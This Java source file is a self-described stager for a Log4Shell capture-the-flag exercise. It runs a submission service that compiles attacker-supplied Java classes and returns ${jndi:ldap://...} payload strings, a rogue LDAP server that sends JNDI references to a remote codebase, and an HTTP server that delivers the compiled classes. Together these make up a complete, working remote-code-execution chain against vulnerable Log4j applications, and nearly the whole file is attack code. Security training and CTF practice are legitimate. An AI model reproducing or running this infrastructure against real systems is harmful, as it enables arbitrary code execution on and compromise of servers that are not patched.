import com.sun.net.httpserver.HttpServer;
import com.unboundid.ldap.listener.InMemoryDirectoryServer;
import com.unboundid.ldap.listener.InMemoryDirectoryServerConfig;
import com.unboundid.ldap.listener.InMemoryListenerConfig;
import com.unboundid.ldap.listener.interceptor.InMemoryInterceptedSearchResult;
import com.unboundid.ldap.listener.interceptor.InMemoryOperationInterceptor;
import com.unboundid.ldap.sdk.Entry;
import com.unboundid.ldap.sdk.LDAPException;
import com.unboundid.ldap.sdk.LDAPResult;
import com.unboundid.ldap.sdk.ResultCode;

import java.io.IOException;
import java.io.InputStream;
import java.io.OutputStream;
import java.io.PrintWriter;
import java.net.InetSocketAddress;
import java.net.ServerSocket;
import java.net.Socket;
import java.nio.charset.StandardCharsets;
import java.nio.file.Files;
import java.util.concurrent.ThreadLocalRandom;
import java.nio.file.Path;
import java.nio.file.Paths;
import java.util.regex.Matcher;
import java.util.regex.Pattern;

/**
 * All-in-one stager for Log4Shell CTF.
 *
 * Three listeners:
 *   SUBMIT  — accepts Java source via TCP, compiles it, returns the payload string
 *   LDAP    — redirects JNDI lookups to the HTTP codebase
 *   HTTP    — serves compiled .class files
 *
 * Usage:
 *   java -jar stager.jar <class-dir> [submit-port] [ldap-port] [http-port]
 */
public class StagerServer {

    private static final int MAX_SOURCE_BYTES = 64 * 1024;
    private static final Pattern CLASS_NAME = Pattern.compile("(?:public\\s+)?class\\s+(\\w+)");

    public static void main(String[] args) throws Exception {
        if (args.length < 1) {
            System.err.println("usage: java -jar stager.jar <class-dir> [submit-port] [ldap-port] [http-port]");
            System.exit(1);
        }

        Path classDir  = Paths.get(args[0]).toAbsolutePath().normalize();
        int submitPort = args.length > 1 ? Integer.parseInt(args[1]) : 34249;
        int ldapPort   = args.length > 2 ? Integer.parseInt(args[2]) : 45342;
        int httpPort   = args.length > 3 ? Integer.parseInt(args[3]) : 34390;

        Files.createDirectories(classDir);
        String codebase = "http://stager:" + httpPort + "/";

        startHttp(httpPort, classDir);
        startLdap(ldapPort, codebase);
        startSubmissions(submitPort, classDir, ldapPort);
    }

    // ── Submit: accept source, compile, return payload string ────────

    private static void startSubmissions(int port, Path classDir, int ldapPort) throws IOException {
        ServerSocket ss = new ServerSocket(port);
        System.out.printf("[submit] accepting payloads on :%d%n", port);

        while (true) {
            Socket client = ss.accept();
            new Thread(() -> handleSubmission(client, classDir, ldapPort)).start();
        }
    }

    private static void handleSubmission(Socket client, Path classDir, int ldapPort) {
        try (
            InputStream in = client.getInputStream();
            PrintWriter out = new PrintWriter(client.getOutputStream(), true)
        ) {
            byte[] raw = in.readNBytes(MAX_SOURCE_BYTES);
            String source = new String(raw, StandardCharsets.UTF_8).trim();

            if (source.isEmpty()) {
                out.println("error: empty submission");
                return;
            }

            Matcher m = CLASS_NAME.matcher(source);
            if (!m.find()) {
                out.println("error: no class definition found");
                return;
            }
            String origName = m.group(1);
            String suffix = String.format("%04x", ThreadLocalRandom.current().nextInt(0x10000));
            String className = origName + "_" + suffix;
            source = source.replace(origName, className);

            // Write source and compile
            Path javaFile = classDir.resolve(className + ".java");
            Files.writeString(javaFile, source);

            Process proc = new ProcessBuilder("javac", "-d", classDir.toString(), javaFile.toString())
                .redirectErrorStream(true)
                .start();
            String compilerOutput = new String(proc.getInputStream().readAllBytes(), StandardCharsets.UTF_8);
            int exitCode = proc.waitFor();

            Files.deleteIfExists(javaFile);

            if (exitCode != 0) {
                out.println("compile error:");
                out.println(compilerOutput);
                return;
            }

            Path classFile = classDir.resolve(className + ".class");
            out.printf("compiled %s (%d bytes)%n%n", className + ".class", Files.size(classFile));
            out.printf("  ${jndi:ldap://stager:%d/%s}%n", ldapPort, className);

            System.out.printf("[submit] %s -> %s.class%n",
                client.getRemoteSocketAddress(), className);
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    // ── HTTP: serve .class files ─────────────────────────────────────

    private static void startHttp(int port, Path classDir) throws IOException {
        HttpServer http = HttpServer.create(new InetSocketAddress(port), 0);
        http.createContext("/", exchange -> {
            String reqPath = exchange.getRequestURI().getPath();
            if (reqPath.startsWith("/")) reqPath = reqPath.substring(1);

            Path file = classDir.resolve(reqPath).normalize();
            if (!file.startsWith(classDir)) {
                exchange.sendResponseHeaders(403, -1);
                exchange.close();
                return;
            }

            if (Files.exists(file) && Files.isRegularFile(file)) {
                byte[] data = Files.readAllBytes(file);
                exchange.getResponseHeaders().set("Content-Type", "application/octet-stream");
                exchange.sendResponseHeaders(200, data.length);
                try (OutputStream os = exchange.getResponseBody()) {
                    os.write(data);
                }
                System.out.printf("[http] 200 %s (%d bytes)%n", reqPath, data.length);
            } else {
                exchange.sendResponseHeaders(404, -1);
                exchange.close();
                System.out.printf("[http] 404 %s%n", reqPath);
            }
        });
        http.setExecutor(null);
        http.start();
        System.out.printf("[http] serving %s on :%d%n", classDir, port);
    }

    // ── LDAP: redirect JNDI lookups to HTTP codebase ─────────────────

    private static void startLdap(int port, String codebase) throws Exception {
        InMemoryDirectoryServerConfig config = new InMemoryDirectoryServerConfig("dc=log4shell");
        config.setListenerConfigs(InMemoryListenerConfig.createLDAPConfig("ldap", port));
        config.addInMemoryOperationInterceptor(new JndiRefInterceptor(codebase));

        InMemoryDirectoryServer ds = new InMemoryDirectoryServer(config);
        ds.add("dn: dc=log4shell", "objectClass: top", "objectClass: domain", "dc: log4shell");
        ds.startListening();
        System.out.printf("[ldap] redirecting -> %s on :%d%n", codebase, port);
    }

    private static class JndiRefInterceptor extends InMemoryOperationInterceptor {
        private final String codebase;

        JndiRefInterceptor(String codebase) {
            this.codebase = codebase;
        }

        @Override
        public void processSearchResult(InMemoryInterceptedSearchResult result) {
            String name = result.getRequest().getBaseDN();
            Entry entry = new Entry(name);
            entry.addAttribute("javaClassName", name);
            entry.addAttribute("javaFactory", name);
            entry.addAttribute("javaCodeBase", codebase);
            entry.addAttribute("objectClass", "javaNamingReference");
            try {
                result.sendSearchEntry(entry);
                result.setResult(new LDAPResult(0, ResultCode.SUCCESS));
                System.out.printf("[ldap] ref '%s' -> %s%s.class%n", name, codebase, name);
            } catch (LDAPException e) {
                e.printStackTrace();
            }
        }
    }
}
